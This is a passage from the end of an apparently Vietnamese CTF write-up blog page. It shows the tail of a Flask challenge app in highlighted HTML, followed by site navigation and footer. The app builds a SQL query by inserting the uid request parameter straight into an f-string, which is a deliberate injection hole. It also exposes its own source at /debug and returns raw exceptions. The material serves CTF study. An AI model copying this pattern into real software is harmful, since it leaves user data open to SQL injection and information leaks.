        <span class="n">rv</span> <span class="o">=</span> <span class="p">[</span><span class="nb">dict</span><span class="p">((</span><span class="n">cur</span><span class="o">.</span><span class="n">description</span><span class="p">[</span><span class="n">idx</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">))</span>
                   <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">row</span><span class="p">))</span> <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">cur</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()]</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">rv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="n">rv</span> <span class="k">else</span> <span class="bp">None</span><span class="p">)</span> <span class="k">if</span> <span class="n">one</span> <span class="k">else</span> <span class="n">rv</span>


<span class="nd">@app.before_first_request</span>
<span class="k">def</span> <span class="nf">init_db</span><span class="p">():</span>
    <span class="k">with</span> <span class="n">app</span><span class="o">.</span><span class="n">open_resource</span><span class="p">(</span><span class="s1">&#39;schema.sql&#39;</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">sql</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
        <span class="n">get_db</span><span class="p">()</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span><span class="o">.</span><span class="n">executescript</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>


<span class="err">@</span> <span class="n">app</span><span class="o">.</span><span class="n">teardown_appcontext</span>
<span class="k">def</span> <span class="nf">close_connection</span><span class="p">(</span><span class="n">exception</span><span class="p">):</span>
    <span class="n">db</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="s1">&#39;_database&#39;</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">db</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">db</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>


<span class="err">@</span> <span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="n">uid</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;uid&#39;</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">uid</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">sql</span> <span class="o">=</span> <span class="n">f</span><span class="s2">&#34;SELECT * FROM users WHERE uid=&#39;{uid}&#39;;&#34;</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">query_db</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="n">one</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">result</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;welcome.jinja2&#34;</span><span class="p">,</span> <span class="n">uid</span><span class="o">=</span><span class="n">uid</span><span class="p">,</span> <span class="n">result</span><span class="o">=</span><span class="n">result</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;welcome.jinja2&#34;</span><span class="p">,</span> <span class="n">uid</span><span class="o">=</span><span class="n">uid</span><span class="p">,</span> <span class="n">result</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;welcome.jinja2&#34;</span><span class="p">,</span> <span class="n">uid</span><span class="o">=</span><span class="n">uid</span><span class="p">,</span> <span class="n">result</span><span class="o">=</span><span class="n">e</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;welcome.jinja2&#34;</span><span class="p">,</span> <span class="n">uid</span><span class="o">=</span><span class="n">uid</span><span class="p">,</span> <span class="n">result</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>


<span class="err">@</span> <span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/heath&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">heath</span><span class="p">():</span>
    <span class="k">return</span> <span class="s2">&#34;OK&#34;</span>


<span class="err">@</span> <span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/debug&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(),</span> <span class="n">mimetype</span><span class="o">=</span><span class="s1">&#39;text/plain&#39;</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">1337</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</code></pre></div>

        
          <div class="blog-tags">
            
              
              <a href="https://l3mnt2010.github.io/tags/ctf/">CTF</a>&nbsp;
            
              
              <a href="https://l3mnt2010.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
            
          </div>
        

        

        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://l3mnt2010.github.io/write-up/2024-07-27-corctf2024/" data-toggle="tooltip" data-placement="top" title="CorCTF2024 - WEB &#39;s challenges">&larr; Previous Post</a>
            </li>
          
          
            <li class="next">
              <a href="https://l3mnt2010.github.io/write-up/2023-08-19-bksecctf2023/" data-toggle="tooltip" data-placement="top" title="BKSEC-CTF-2023 - WEB &#39;s challenges">Next Post &rarr;</a>
            </li>
          
        </ul>
      


      

    </div>
  </div>
</div>

      <footer>
  <div class="container">
    
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
          
        </ul>
        <p class="credits copyright text-muted">
          

          &nbsp;&bull;&nbsp;&copy;
          
            0001
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>

<script src="https://l3mnt2010.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://l3mnt2010.github.io/js/load-photoswipe.js"></script>










    
  </body>
</html>

